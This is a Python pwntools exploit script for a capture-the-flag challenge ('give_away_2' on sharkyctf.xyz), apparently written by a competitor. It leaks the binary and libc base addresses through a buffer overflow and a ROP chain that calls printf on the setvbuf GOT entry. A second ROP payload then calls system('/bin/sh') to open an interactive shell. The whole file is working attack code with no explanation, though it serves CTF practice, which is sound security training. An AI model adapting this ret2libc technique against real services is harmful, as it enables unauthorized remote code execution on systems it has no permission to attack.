from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./give_away_2"
HOST = "sharkyctf.xyz"
PORT = 20335

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
off_main = elf.symbols["main"]
off_plt_printf = elf.plt["printf"]
off_got_setvbuf = elf.got["setvbuf"]

off_rdi_ret = 0x903
off_rsi_r15_ret = 0x901
off_ret = 0x676
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
libc = ELF('./libc-2.27.so')
off_setvbuf = libc.symbols["setvbuf"]
off_system = libc.symbols["system"]
off_binsh = next(libc.search("/bin/sh"))
gadget = [0x4f2c5, 0x4f322, 0x10a38c]

def exploit():
	bufsize = 0x20+8
	
	conn.recvuntil("away: ")
	addr_main = int(conn.recvline(),16)
	bin_base = addr_main - off_main
	
	plt_printf = bin_base + off_plt_printf
	got_setvbuf = bin_base + off_got_setvbuf
	rdi_ret = bin_base + off_rdi_ret
	rsi_r15_ret = bin_base + off_rsi_r15_ret
	only_ret = bin_base + off_ret	
	
	print hex(bin_base)
	payload = "A"*bufsize
	payload += p64(only_ret)
	payload += p64(rdi_ret)
	payload += p64(got_setvbuf)
	payload += p64(plt_printf)
	payload += p64(only_ret)
	payload += p64(addr_main)
	
	conn.sendline(payload)
	libc_setvbuf = u64(conn.recv(6)+"\x00\x00")
	libc_base = libc_setvbuf - off_setvbuf
	libc_system = libc_base + off_system
	libc_binsh = libc_base + off_binsh
	print hex(libc_base)
	payload = "A"*bufsize
	payload += p64(only_ret)
	payload += p64(rdi_ret)
	payload += p64(libc_binsh)
	payload += p64(libc_system)

	conn.sendline(payload)	
	conn.recvline()
	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
